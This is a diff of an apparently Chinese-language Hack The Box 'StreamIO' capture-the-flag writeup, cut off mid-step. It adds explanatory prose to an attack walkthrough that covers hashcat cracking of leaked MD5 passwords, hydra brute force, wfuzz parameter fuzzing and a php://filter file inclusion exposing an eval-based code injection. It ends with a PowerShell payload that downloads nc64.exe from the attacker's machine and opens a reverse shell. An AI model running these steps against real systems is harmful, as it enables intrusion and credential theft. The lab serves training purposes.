@@ -42,9 +42,9 @@
 
   <meta itemprop="name" content="HTB-StreamIO Writeup">
   <meta itemprop="description" content="初始侦察 Nmap 端口扫描 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO] └─$ sudo nmap --min-rate 10000 -p- 10.129.6.162 -oA ports Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 02:35 EDT Nmap scan report for 10.129.6.162 Host is up (0.17s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49667/tcp open unknown 49677/tcp open unknown 49678/tcp open unknown 49704/tcp open unknown 49731/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 13.75 seconds 将端口格式化备用。">
-  <meta itemprop="datePublished" content="2026-03-19T13:00:00+08:00">
-  <meta itemprop="dateModified" content="2026-03-19T13:00:00+08:00">
-  <meta itemprop="wordCount" content="5726">
+  <meta itemprop="datePublished" content="2026-04-05T12:00:00+08:00">
+  <meta itemprop="dateModified" content="2026-04-05T12:00:00+08:00">
+  <meta itemprop="wordCount" content="6053">
   <meta itemprop="keywords" content="Hack,HTB,Writeup">
 
   <meta name="twitter:card" content="summary">
@@ -57,7 +57,7 @@
 
 
 
-    <meta property="article:published_time" content="2026-03-19 13:00:00 &#43;0800 CST" />
+    <meta property="article:published_time" content="2026-04-05 12:00:00 &#43;0800 CST" />
 
 
 
@@ -122,7 +122,7 @@
           <circle cx="12" cy="12" r="10"></circle>
           <polyline points="12 6 12 12 16 14"></polyline>
         </svg>
-        27 minutes
+        29 minutes
 
         
       </p>
@@ -153,6 +153,13 @@
       <ul>
         <li><a href="#sql-注入">SQL 注入</a></li>
         <li><a href="#hashcat-暴力破解">Hashcat 暴力破解</a></li>
+      </ul>
+    </li>
+    <li><a href="#文件包含利用">文件包含利用</a></li>
+    <li><a href="#获得-nikk37-权限">获得 nikk37 权限</a></li>
+    <li><a href="#获得-jdgodd-权限">获得 JDgodd 权限</a>
+      <ul>
+        <li><a href="#bloodhound-渗透">bloodhound 渗透</a></li>
       </ul>
     </li>
   </ul>
@@ -517,6 +524,7 @@
 </span></span><span style="display:flex;"><span>William:d62be0dc82071bccc1322d64ec5b6c51                                       
 </span></span><span style="display:flex;"><span>yoshihide:b779ba15cedfd22a023c4d8bcf5f2332 
 </span></span></code></pre></div><h3 id="hashcat-暴力破解">Hashcat 暴力破解</h3>
+<p>使用 hashcat 暴力破解获取到的用户与密码。<code>--user</code> 指定前面为用户名，<code>-m 0</code> 指定为 <code>md5</code> 格式。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ sudo hashcat --user -m <span style="color:#ae81ff">0</span> hash.lst /usr/share/wordlists/rockyou.txt
 </span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
@@ -638,7 +646,8 @@
 </span></span><span style="display:flex;"><span>b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
 </span></span><span style="display:flex;"><span>b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
 </span></span><span style="display:flex;"><span>f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>分别储存提取的账户与密码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ cat hash.lst| cut -d: -f1 &gt; users
 </span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                                                                         
 </span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
@@ -691,7 +700,8 @@
 </span></span><span style="display:flex;"><span>!5psycho8!               
 </span></span><span style="display:flex;"><span>!?Love?!123              
 </span></span><span style="display:flex;"><span>!!sabrina$
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>使用 crackmapexec 测试 smb 登入。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ crackmapexec smb streamio.htb -u user -p pass --no-bruteforce --continue-on-success
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:streamIO.htb<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\u</span>ser:highschoolmusical STATUS_LOGON_FAILURE 
@@ -706,7 +716,8 @@
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\u</span>ser:!5psycho8! STATUS_LOGON_FAILURE 
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\u</span>ser:!?Love?!123 STATUS_LOGON_FAILURE 
 </span></span><span style="display:flex;"><span>SMB         watch.streamIO.htb <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> streamIO.htb<span style="color:#ae81ff">\u</span>ser:!!sabrina$ STATUS_LOGON_FAILURE 
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>均无法登入，修改数据格式。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ sudo hashcat --user -m <span style="color:#ae81ff">0</span> hash.lst /usr/share/wordlists/rockyou.txt --show | tee user-pass                     
 </span></span><span style="display:flex;"><span>admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
 </span></span><span style="display:flex;"><span>Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
@@ -749,7 +760,8 @@
 </span></span><span style="display:flex;"><span>Thane:highschoolmusical
 </span></span><span style="display:flex;"><span>Victoria:!5psycho8!
 </span></span><span style="display:flex;"><span>yoshihide:66boysandgirls..
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>使用 hydra 破解。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ hydra -C userspass streamio.htb https-post-form <span style="color:#e6db74">&#34;/login.php:username=^USER^&amp;password=^PASS^:F=failed&#34;</span> 
 </span></span><span style="display:flex;"><span>Hydra v9.5 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
 </span></span><span style="display:flex;"><span>
@@ -759,9 +771,12 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>443<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: streamio.htb   login: yoshihide   password: 66boysandgirls..
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
 </span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2026-03-24 10:39:20
-</span></span></code></pre></div><p><img src="Pasted%20image%2020260324225127.png" alt=""></p>
+</span></span></code></pre></div><p>成功破解出一个账户 <code>yoshihide</code>，密码是 <code>66boysandgirls..</code>，尝试进行登入。</p>
+<p>在之前爆破出来的 <code>admin</code> 页面发现是一个后台管理系统，点击不同的选项在 url 处会显示不同的参数。</p>
+<p><img src="Pasted%20image%2020260324225127.png" alt=""></p>
 <p><img src="Pasted%20image%2020260324225314.png" alt=""></p>
 <p><img src="Pasted%20image%2020260324225325.png" alt=""></p>
+<p>可能还有未暴露出来的参数，使用 wfuzz 尝试进行爆破。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ wfuzz -u https://streamio.htb/admin/?FUZZ<span style="color:#f92672">=</span> -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H <span style="color:#e6db74">&#34;Cookie:PHPSESSID=gglbps4hbr1vt31saqjev4q6ho&#34;</span> --hh <span style="color:#ae81ff">1678</span>
 </span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
@@ -786,8 +801,13 @@
 </span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">6453</span>
 </span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">6449</span>
 </span></span><span style="display:flex;"><span>Requests/sec.: 94.32320
-</span></span></code></pre></div><p><img src="Pasted%20image%2020260324230342.png" alt=""></p>
+</span></span></code></pre></div><p>爆破出来一个新的参数 <code>debug</code>。</p>
+<h2 id="文件包含利用">文件包含利用</h2>
+<p>尝试使用 <code>debug</code> 进行调试，显示这个选项仅允许开发者使用。</p>
+<p><img src="Pasted%20image%2020260324230342.png" alt=""></p>
+<p>尝试调试 <code>index.php</code>，界面多出一个错误信息 <code>ERROR</code>。</p>
 <p><img src="Pasted%20image%2020260324230500.png" alt=""></p>
+<p>进行目录爆破尝试发现更多目录。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ sudo feroxbuster -u https://streamio.htb/admin -x php -k
 </span></span><span style="display:flex;"><span>                                                                                                                                                                                    
@@ -846,10 +866,12 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/Js/ </span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">####################] - 76m    30000/30000   7/s     https://streamio.htb/admin/Css/ </span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#75715e">####################] - 75m    30000/30000   7/s     https://streamio.htb/admin/Fonts/</span>
-</span></span></code></pre></div><p><code>master.php</code></p>
+</span></span></code></pre></div><p>爆破出一个新的页面 <code>master.php</code>，使用 <code>debug</code> 进行调试，发现这个界面包含所有的数据。</p>
 <p><img src="Pasted%20image%2020260325221408.png" alt=""></p>
+<p>在调试语境下为了读取到源码而不是执行源码，使用伪协议 <code>php://filter/convert.base64-encode/resource=</code> 尝试调试 <code>master.php</code> ， <code>php://filter</code> 是 PHP 内置的流过滤器为协议，并将读取到的文件内容进行 base64 编码。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://streamio.htb/admin/?debug<span style="color:#f92672">=</span>php://filter/convert.base64-encode/resource<span style="color:#f92672">=</span>master.php
 </span></span></code></pre></div><p><img src="Pasted%20image%2020260330170023.png" alt=""></p>
+<p>将读取到的数据保存至本地。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg== &#34;</span> | base64 -d | tee master.php
 </span></span><span style="display:flex;"><span>base64: invalid input
@@ -958,19 +980,31 @@
 </span></span><span style="display:flex;"><span>echo<span style="color:#f92672">(</span><span style="color:#e6db74">&#34; ---- ERROR ---- &#34;</span><span style="color:#f92672">)</span>;
 </span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
 </span></span><span style="display:flex;"><span>?&gt;                               
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>阅读源码发现 <code>include</code> 参数未做任何过滤。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>isset<span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;include&#39;</span><span style="color:#f92672">]))</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;include&#39;</span><span style="color:#f92672">]</span> !<span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;index.php&#34;</span> <span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>eval<span style="color:#f92672">(</span>file_get_contents<span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;include&#39;</span><span style="color:#f92672">]))</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>echo<span style="color:#f92672">(</span><span style="color:#e6db74">&#34; ---- ERROR ---- &#34;</span><span style="color:#f92672">)</span>;
+</span></span></code></pre></div><p>准备好可用的 <code>nc64.exe</code>，准备执行反弹 shell。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ ls -liah nc64.exe 
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">2764208</span> -rwxrwxr-x <span style="color:#ae81ff">1</span> kali kali 45K Mar <span style="color:#ae81ff">30</span> 05:21 nc64.exe
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>编写一个脚本，使用 powershell 下载 kali 中的 <code>nc64.exe</code>，保存至 <code>programdata</code> 下，然后回连至 kali。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ vim shell.py                      
 </span></span><span style="display:flex;"><span>                                                                                                                                                                                                                  
 </span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>└─$ cat shell.py                
 </span></span><span style="display:flex;"><span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;powershell -c wget http://10.10.16.58/nc64.exe -outfile \\programdata\\nc64.exe&#39;</span><span style="color:#f92672">)</span>;
 </span></span><span style="display:flex;"><span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;\\programdata\\nc64.exe -e powershell 10.10.16.58 443&#39;</span><span style="color:#f92672">)</span>;
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>执行 <code>shell.py</code> 获得的 <code>yoshihide</code> 的权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/StreamIO<span style="color:#f92672">]</span>
